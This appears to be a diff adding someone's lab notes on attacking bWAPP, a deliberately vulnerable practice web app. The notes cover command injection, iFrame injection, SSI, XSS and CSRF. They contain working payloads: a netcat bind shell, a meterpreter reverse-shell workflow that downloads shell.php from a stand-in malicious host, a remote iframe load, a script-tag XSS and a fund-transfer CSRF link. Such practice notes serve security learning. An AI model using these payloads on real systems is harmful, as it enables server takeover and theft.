@@ -1,0 +1,57 @@
+bWAPP
+============================================================
+OS Command Injection
+============================================================
+# This challenge provides a DNS Lookup search bar.
+# By entering ; at the end, you can enter more commands after.
+# To create a quick, interactive shell, you can enter the following...
+; nc -vlp 2222 -e /bin/bash			// netcat --verbose --listen --port --execute
+
+### ...on the other end
+nc 127.0.0.1 2222
+
+## You may also want to upload a meterpreter shell
+## Steps go as followed:
+## 	1. msfvenom -p php/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o shell.php
+##	2. On the Web Server, ; curl -O http://malicious-site.com/shell.php
+##	3. On your malicious server, start metasploit and listen.
+##	4. On the Web Server, ; php -f shell.php
+##	5. Profit.
+##
+## Worth noting, I wasn't able to access the website when the shell was live. Once I killed the connection, the website resumed. Not sure if that's just for the one connection, or all connections to the web server.
+
+============================================================
+iFrame Injection
+============================================================
+The url looks like this:
+localhost/bWAPP/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250
+
+## You can change the Width and Height settings to make something more visible, or invisible.
+## I was able to execute dmalloc.php by putting the ParamUrl=../dmalloc.php
+## You can also execute a php file online. Doesn't have to be on the WebServer itself.
+## localhost/bWAPP/iframei.php?ParamUrl=http://shady.com/dmalloc.php&ParamWidth=1&ParamHeight=1
+## This doesn't stop the Web Server like the OS Command Injection does.
+
+
+============================================================
+Server Side Injection (SSI)
+============================================================
+## Trying to test this one, but the code that's suppose to run on the server side isn't working
+## <--#echo var="REMOTE_ADDR" -->
+
+============================================================
+Cross Site Scripting Reflective (XSS)
+============================================================
+## You can enter directly into a textbox some javascript, and it'll execute that js. This attack is good if you make someone click on a link, which will then execute you on their side. You can dump their cookies or something fancy.
+<script>alert("hi")</script>
+
+## You can also enter this into other fields such as User-Agent, etc.
+## All depends on what is sanitized and what isn't.
+
+============================================================
+Cross Site Request Forgery
+============================================================
+## When clicked on, sends a request to a webserver to do an action, such as change a password. If a user clicks on a malicious link, they can change their password to a website that's not currently visible to them.
+Create a website with <a href="http://192.168.2.202/bWAPP/csrf_2.php?account=123-45678-90&amount=999&action=transfer" /> to transfer all his funds out of his account.
+
+
